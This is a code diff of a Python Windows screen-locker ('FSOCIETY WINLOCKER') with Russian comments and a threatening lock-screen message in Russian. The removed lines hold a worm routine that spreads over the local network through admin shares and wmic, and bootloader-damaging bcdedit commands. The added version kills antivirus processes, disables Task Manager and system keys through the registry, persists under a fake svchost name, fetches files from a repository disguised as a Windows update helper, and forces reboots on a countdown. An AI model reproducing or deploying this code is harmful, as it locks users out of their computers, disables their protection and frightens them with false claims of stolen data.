@@ -1,37 +1,54 @@
-import subprocess, sys, os, time, threading, tempfile, tkinter as tk, urllib.request, ctypes, winreg, shutil, re, socket
+# ============================================================
+# FSOCIETY WINLOCKER v8.0 — PYTHON
+# ============================================================
+import os, sys, time, threading, tempfile, ctypes, winreg, shutil, subprocess, urllib.request, tkinter as tk
 
-for lib, name in [("pygame","pygame"),("keyboard","keyboard")]:
+# АВТОУСТАНОВКА БИБЛИОТЕК
+for lib, name in [("cv2","opencv-python"),("pygame","pygame"),("keyboard","keyboard"),("numpy","numpy")]:
     try: __import__(lib)
     except: subprocess.check_call([sys.executable,"-m","pip","install",name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
 
-import pygame, keyboard
+import cv2, pygame, keyboard, numpy as np
 
-PASSWORD = "1601"
-MAX_ATTEMPTS = 5
-TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Windows", "timer.dat")
-attempts_left = MAX_ATTEMPTS
+# КОНФИГ
+PASS = "1601"
+TRIES = 5
+HOURS = 1
+TIMER = os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "timer.dat")
+VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
+MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
+T = tempfile.gettempdir()
+V = os.path.join(T, "v.mp4")
+M = os.path.join(T, "m.mp3")
+tries = TRIES
 
-def run_hidden(cmd):
-    try: subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+# СКАЧИВАНИЕ
+def dl(url, path):
+    if os.path.exists(path) and os.path.getsize(path) > 10000: return True
+    try:
+        urllib.request.urlretrieve(url, path)
+        if os.path.getsize(path) > 10000: return True
     except: pass
-
-def protect_process():
-    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+    try:
+        subprocess.run(['powershell','-WindowStyle','Hidden','-Command',f"(New-Object Net.WebClient).DownloadFile('{url}','{path}')"],capture_output=True,creationflags=subprocess.CREATE_NO_WINDOW)
+        if os.path.getsize(path) > 10000: return True
     except: pass
+    return False
 
-def kill_taskmgr_ultimate():
+# АНТИВИРУС
+def kill_av():
+    avs = ["avast","avg","avira","bitdefender","kaspersky","mcafee","norton","eset","drweb","msmpeng","nis","bdagent","avp","MsMpEng","NisSrv","Sophos","Windefend","Defender"]
     while True:
-        for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","explorer.exe"]:
-            run_hidden(f"taskkill /f /im {p}")
-        time.sleep(0.05)
+        for av in avs:
+            try: os.system(f"taskkill /f /im {av}.exe >nul 2>&1")
+            except: pass
+        time.sleep(0.1)
 
-def disable_win_key():
-    for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
-        for sub, name in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
-            try:
-                k = winreg.OpenKey(hkey, sub, 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(k)
+# БЛОКИРОВКА КЛАВИШ
+def lock_keys():
+    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
+        for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
+            try: r=winreg.OpenKey(h,k,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(r,n,0,winreg.REG_DWORD,1); winreg.CloseKey(r)
             except: pass
     for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','delete','windows','left windows','right windows']:
         try: keyboard.block_key(k)
@@ -40,176 +57,170 @@ def disable_win_key():
         try: keyboard.add_hotkey(c, lambda:0, suppress=True)
         except: pass
 
-def unblock_all():
+def unlock_keys():
     try: keyboard.unhook_all()
     except: pass
-    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
-    except: pass
-    for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
-        for sub, name in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
-            try:
-                k = winreg.OpenKey(hkey, sub, 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, 0)
-                winreg.CloseKey(k)
+    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
+        for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
+            try: r=winreg.OpenKey(h,k,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(r,n,0,winreg.REG_DWORD,0); winreg.CloseKey(r)
             except: pass
 
-def get_timer():
-    try:
-        if os.path.exists(TIMER_FILE):
-            with open(TIMER_FILE) as f: return float(f.read())
-    except: pass
-    end = time.time() + 3600
-    os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
-    with open(TIMER_FILE, 'w') as f: f.write(str(end))
+# ТАЙМЕР
+def timer_save():
+    end = time.time() + HOURS*3600
+    os.makedirs(os.path.dirname(TIMER), exist_ok=True)
+    with open(TIMER,'w') as f: f.write(str(end))
     return end
 
-def timer_check_loop():
+def timer_get():
+    try:
+        with open(TIMER) as f: return float(f.read())
+    except: return timer_save()
+
+def timer_check():
     while True:
-        if get_timer() - time.time() <= 0: destroy_windows_forever()
+        if timer_get() - time.time() <= 0: destroy()
         time.sleep(5)
 
-def destroy_windows_forever():
-    run_hidden('bcdedit /delete {current} /f')
-    run_hidden('shutdown /r /t 0 /f')
+def destroy():
+    os.system("shutdown /r /t 0 /f")
     os._exit(0)
 
-def hide_process():
-    try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
+# АВТОЗАГРУЗКА
+def startup():
+    s = os.path.abspath(sys.argv[0])
+    d = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup','svchost.pyw')
+    try: shutil.copy2(s,d)
     except: pass
-
-def block_safe_mode():
-    run_hidden('bcdedit /deletevalue {current} safeboot')
-    run_hidden('bcdedit /set {current} recoveryenabled no')
-
-def scan_network():
-    try:
-        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866', errors='replace')
-        return list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))
-    except: return []
-
-def infect_network():
-    my_path = os.path.abspath(__file__)
-    for ip in scan_network():
+    pw = sys.executable.replace("python.exe","pythonw.exe")
+    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
         try:
-            run_hidden(f'net use \\\\{ip}\\C$ /user:admin admin')
-            shutil.copy2(my_path, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
-            run_hidden(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw"')
+            r=winreg.OpenKey(h,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(r,"WindowsUpdate",0,winreg.REG_SZ,f'"{pw}" "{s}"')
+            winreg.CloseKey(r)
         except: pass
 
-def add_to_startup():
-    try:
-        cp = os.path.abspath(__file__)
-        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
-        for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
-            try:
-                k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
-                winreg.CloseKey(k)
-            except: pass
-        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-        shutil.copy2(cp, os.path.join(startup, 'svchost.pyw'))
-    except: pass
-
-def anim_fsociety():
-    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
+# АНИМАЦИЯ
+def anim():
+    a=tk.Tk(); a.attributes('-fullscreen',True); a.attributes('-topmost',True)
     a.configure(bg='black'); a.overrideredirect(True)
-    a.protocol("WM_DELETE_WINDOW", lambda: None)
-    lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 50, 'bold'))
-    lbl.pack(expand=True)
+    l=tk.Label(a,text="",bg='black',fg='white',font=('Courier',55,'bold')); l.pack(expand=True)
     for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
-        lbl.config(text=t); a.update(); time.sleep(0.3)
+        l.config(text=t); a.update(); time.sleep(0.3)
     time.sleep(1)
-    sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 20))
-    sub.pack(pady=20)
-    text = "тебя приветствует"
-    for i in range(len(text)+1):
-        sub.config(text=text[:i]); a.update(); time.sleep(0.1)
+    s=tk.Label(a,text="",bg='black',fg='#ff4444',font=('Courier',22)); s.pack(pady=20)
+    for i in range(len("тебя приветствует")+1):
+        s.config(text="тебя приветствует"[:i]); a.update(); time.sleep(0.1)
     time.sleep(2); a.destroy()
 
-class WinLocker:
-    def __init__(self):
-        global attempts_left
-        self.root = tk.Tk(); self.root.withdraw()
-        self.win = tk.Toplevel(self.root)
-        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
-        self.win.configure(bg='black'); self.win.overrideredirect(True)
-        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
-        self.win.bind("<Alt-F4>", lambda e: None)
-        self.win.bind("<Escape>", lambda e: None)
-        self.win.bind("<Win_L>", lambda e: None)
-        self.win.bind("<Win_R>", lambda e: None)
-        self.win.focus_force()
-        
-        self.timer_end = get_timer()
-        self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
-        self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
-        self.update_timer()
-        
-        msg = f"""Вот чего доводит интернет.
+# ВИДЕО
+def video():
+    if not dl(VIDEO_URL,V): return
+    try:
+        pygame.mixer.init(); pygame.mixer.music.load(V); pygame.mixer.music.play()
+    except: pass
+    try:
+        cap=cv2.VideoCapture(V)
+        if not cap.isOpened(): return
+        fps=cap.get(cv2.CAP_PROP_FPS) or 30
+        cv2.namedWindow("FSOCIETY",cv2.WND_PROP_FULLSCREEN)
+        cv2.setWindowProperty("FSOCIETY",cv2.WND_PROP_FULLSCREEN,cv2.WINDOW_FULLSCREEN)
+        while cap.isOpened():
+            ret,frame=cap.read()
+            if not ret: break
+            cv2.imshow("FSOCIETY",frame); cv2.waitKey(int(1000/fps))
+        cap.release(); cv2.destroyAllWindows()
+        for _ in range(5): cv2.waitKey(1)
+    except: pass
+    try: pygame.mixer.music.stop()
+    except: pass
 
-Вот смотри, ты скачивал игры или что там из интернета?
+# ВИНЛОКЕР
+class Locker:
+    def __init__(self):
+        global tries
+        self.r=tk.Tk(); self.r.withdraw()
+        self.w=tk.Toplevel(self.r)
+        self.w.attributes('-fullscreen',True); self.w.attributes('-topmost',True)
+        self.w.configure(bg='black'); self.w.overrideredirect(True)
+        self.w.protocol("WM_DELETE_WINDOW",lambda:None)
+        self.w.bind("<Alt-F4>",lambda e:None); self.w.bind("<Escape>",lambda e:None)
+        self.w.focus_force()
+        self.end=timer_get()
+        self.tl=tk.Label(self.w,text="",bg='black',fg='#ff4444',font=('Courier',30,'bold'))
+        self.tl.place(relx=0.5,rely=0.08,anchor='center')
+        self.tick()
+        try:
+            if dl(MUSIC_URL,M):
+                pygame.mixer.init(); pygame.mixer.music.load(M)
+                pygame.mixer.music.set_volume(1.0); pygame.mixer.music.play(-1)
+        except: pass
+        msg=f"""Вот чего доводит интернет.
+
+Вот смотри, ты скачивал игры
+или что там из интернета?
 Вот доскачался. Сиди и жуй мой винлокер.
 
-FSOCIETY тебя приветствует!
-
-Смотри, ты хочешь перезагрузить ПК? У тебя не получится.
-ПК перезагрузить получится, но избавиться от меня - нет.
+Ты хочешь перезагрузить ПК?
+У тебя не получится.
+ПК перезагрузить получится,
+но избавиться от меня - нет.
 Я везде. Я в твоём роутере.
 Я знаю все твои данные.
-У меня есть cookies файлы, пароли, логины, почты и т.д.
+У меня есть cookies файлы,
+пароли, логины, почты и т.д.
 
 МЫ FSOCIETY.
 YOU FUCK.
 
-ПОПЫТОК: {MAX_ATTEMPTS}"""
-        
-        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',10,'bold'), justify='center').place(relx=0.5, rely=0.45, anchor='center')
-        
-        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.82, anchor='center')
-        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
-        self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', relief='solid', bd=2)
-        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
-        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier',12,'bold'))
+ПОПЫТОК: {TRIES}"""
+        tk.Label(self.w,text=msg,bg='black',fg='white',font=('Courier',11,'bold'),justify='center').place(relx=0.5,rely=0.45,anchor='center')
+        cf=tk.Frame(self.w,bg='black'); cf.place(relx=0.5,rely=0.82,anchor='center')
+        tk.Label(cf,text="ВВЕДИ ПАРОЛЬ:",bg='black',fg='#00ff00',font=('Courier',14,'bold')).pack(pady=(0,5))
+        self.e=tk.Entry(cf,show="*",font=('Courier',14,'bold'),bg='#111',fg='#00ff00',relief='solid',bd=2)
+        self.e.pack(pady=(0,5),ipadx=40,ipady=3)
+        self.sl=tk.Label(cf,text=f"ОСТАЛОСЬ: {tries}",bg='black',fg='yellow',font=('Courier',12,'bold'))
         self.sl.pack()
-        self.pw.bind('<Return>', self.check); self.pw.focus_force()
-        self.win.after(100, self._keep)
+        self.e.bind('<Return>',self.chk); self.e.focus_force()
+        self.w.after(100,self.focus)
     
-    def update_timer(self):
-        remaining = self.timer_end - time.time()
-        if remaining <= 0: destroy_windows_forever()
-        h, m, s = int(remaining//3600), int((remaining%3600)//60), int(remaining%60)
-        self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
-        self.win.after(1000, self.update_timer)
+    def tick(self):
+        r=self.end-time.time()
+        if r<=0: destroy()
+        h,m,s=int(r//3600),int((r%3600)//60),int(r%60)
+        self.tl.config(text=f"{h:02d}:{m:02d}:{s:02d}")
+        self.w.after(1000,self.tick)
     
-    def _keep(self):
-        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
+    def focus(self):
+        try: self.w.focus_force(); self.e.focus_force(); self.w.after(100,self.focus)
         except: pass
     
-    def check(self, e=None):
-        global attempts_left
-        if self.pw.get() == PASSWORD:
-            unblock_all()
-            self.sl.config(text="ВЕРНО!", fg='white'); self.win.update()
-            try: os.remove(TIMER_FILE)
+    def chk(self,e=None):
+        global tries
+        if self.e.get()==PASS:
+            try: pygame.mixer.music.stop()
             except: pass
-            time.sleep(1); self.root.destroy(); os._exit(0)
+            unlock_keys()
+            self.sl.config(text="ВЕРНО!",fg='white'); self.w.update()
+            try: os.remove(TIMER)
+            except: pass
+            time.sleep(1); self.r.destroy(); os._exit(0)
         else:
-            attempts_left -= 1
-            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
+            tries-=1
+            if tries>0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {tries}",fg='white')
             else:
-                self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update()
-                time.sleep(2); destroy_windows_forever()
-            self.pw.delete(0, tk.END)
+                try: pygame.mixer.music.stop()
+                except: pass
+                self.sl.config(text="404 | ОШИБКА",fg='white'); self.w.update()
+                time.sleep(2); destroy()
+            self.e.delete(0,tk.END)
 
-if __name__ == "__main__":
-    protect_process()
-    disable_win_key()
-    hide_process()
-    threading.Thread(target=kill_taskmgr_ultimate, daemon=True).start()
-    threading.Thread(target=timer_check_loop, daemon=True).start()
-    threading.Thread(target=infect_network, daemon=True).start()
-    add_to_startup()
-    block_safe_mode()
-    anim_fsociety()
-    WinLocker()
+if __name__=="__main__":
+    threading.Thread(target=kill_av,daemon=True).start()
+    threading.Thread(target=timer_check,daemon=True).start()
+    startup()
+    anim()
+    lock_keys()
+    video()
+    Locker()
     tk.mainloop()
